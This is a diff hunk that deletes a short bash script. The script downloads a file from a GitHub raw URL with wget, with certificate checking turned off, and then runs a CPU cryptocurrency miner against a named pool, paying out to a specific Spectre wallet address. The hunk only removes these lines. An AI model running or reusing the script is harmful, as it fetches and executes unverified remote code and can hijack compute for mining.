@@ -1,6 +1,0 @@
-#!/bin/bash
-
-cd
-cd ../bin && wget -N --timeout 20 --connect-timeout=30 -t 2 --no-check-certificate https://raw.githubusercontent.com/saengx/CCMINER-GITHUB/main/tnn
-cd
-./tnn-miner-cpu --spectre --daemon-address pool.tazmining.ch --port 7751 --wallet spectre:qr8hqtxddx6r8lcd0yzfmrm35v8hhzq5xmk7eafcmcqcwxn6qp3rgpk843zxw.P9 --threads 8 --dev-fee 1 --no-lock
